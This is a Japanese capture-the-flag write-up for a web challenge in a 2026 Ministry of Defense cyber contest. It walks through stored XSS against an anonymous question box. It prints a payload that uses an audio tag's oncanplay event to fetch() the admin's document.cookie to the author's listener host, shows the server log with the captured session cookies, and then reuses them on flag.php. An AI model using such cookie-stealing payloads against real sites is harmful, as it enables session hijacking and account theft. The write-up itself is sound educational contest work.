---
title: '静寂の調べ - 防衛省サイバーコンテスト2026'
description: '防衛省サイバーコンテスト2026のWriteupです。'
pubDate: 2026-02-02
category: 'CTF'
tags: ['MODCC', 'Writeup', 'Web', 'XSS']
---

# 静寂の調べ
```html
<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>匿名質問箱</title>
</head>
<body>
    <audio autoplay style="display: none;">
        <source src="data:audio/wav;base64,UklGRnQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YVAAAACAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgA==" type="audio/wav">
    </audio>

    <div class="container">
        <h1 style="text-align: center; color: #495057; font-size: 28px; margin-bottom: 10px;">匿名質問箱</h1>
        <p style="text-align: center; color: #6c757d; margin-bottom: 30px; font-size: 14px;">プライバシー保護機能付きの質問投稿システム</p>

        <div class="info">
            <h3>匿名質問箱へようこそ！</h3>
            <p>質問や相談を匿名で投稿できるサービスです。</p>
            <p><strong>重要:</strong> 管理人が質問を確認すると、プライバシー保護のため投稿は自動的に削除されます。</p>
            <p><strong>あなたのセッションID:</strong> <code>4ae13b94789f9bc71316b783db10e7be</code></p>
            <p><em>ヒント: あなた自身が投稿した質問のみがこちらに表示されます。他の人の質問は見えません。</em></p>
            <p><strong>セッション期限:</strong> セキュリティのため、5分間操作がないとセッションが自動的に期限切れになります。</p>
            <p style="color: #dc3545; margin-top: 12px;"><strong>⚠️ 注意:</strong> 無限ループなどサーバーに負荷をかけるコードを送信した場合、投稿は管理人が確認する前に自動削除され、15分間投稿が規制されることがあります。</p>
        </div>

                    <div class="message success">✅ 質問を送信しました！管理人が確認した後、プライバシー保護のため自動削除されます。</div>
        
        
        <form method="POST">
            <div class="form-group">
                <label for="message">あなたの質問:</label>
                <textarea name="message" id="message" placeholder="何でもお気軽に質問してください。管理人が確認後、プライバシー保護のため削除されます..." required></textarea>
                <small style="color: #6c757d;">最大1000文字まで。基本的なセキュリティフィルターが適用されます。</small>
            </div>
            <button type="submit">質問を送信</button>
        </form>

        <h2 style="color: #495057; border-bottom: 2px solid #e9ecef; padding-bottom: 10px; margin-top: 40px;">あなたの質問履歴</h2>
                                                    <div class="post">
                    <div class="post-time">2026-02-01 11:23:33 JST</div>
                    <div>[BLOCKED]</div>
                </div>
                    
        <div style="margin-top: 30px; text-align: center;">
            <a href="flag.php" class="flag-link">管理人専用ページ</a>
        </div>

        <footer style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #dee2e6; color: #6c757d; text-align: center;">
            <p>匿名質問箱システム - プライバシー保護機能付き</p>
            <p style="font-size: 12px;">質問は管理人確認後に自動削除されます</p>
        </footer>
    </div>
</body>
</html>
```

> audioタグが使われており、BurpSuiteを使って有効なeventsを列挙  
`oncanplay`が有効だったのでこのeventsを使ってペイロードを作成

```html
<audio autoplay oncanplay="fetch('http://10.35.0.81:8000/?c='+document.cookie)" style="display:none">
  <source src="data:audio/wav;base64,UklGRnQAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YVAAAACAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgA==" type="audio/wav">
</audio>
```

> VPN接続していたので自分の環境で`python3 -m http.server 8000`でcookieが届くようにした
```bash
10.2.0.7 - - [01/Feb/2026 11:43:29] "GET /?c=admin_session=416e2d751b6a0eaca1b2640a75e9e888e37708054e0cc76118d4faea21dfae50;%20admin_session_regular=cbfee9f5b4fa110e0b6a11db368502af89541c259d8c7904d3a9066058eafc7e;%20PHPSESSID=a924c621cb2d76ef962185b47da56bd5 HTTP/1.1" 200 -
```

> 取得したCookie値を加えてflag.phpにアクセス

```bash
http://10.2.0.7:8086/flag.php
```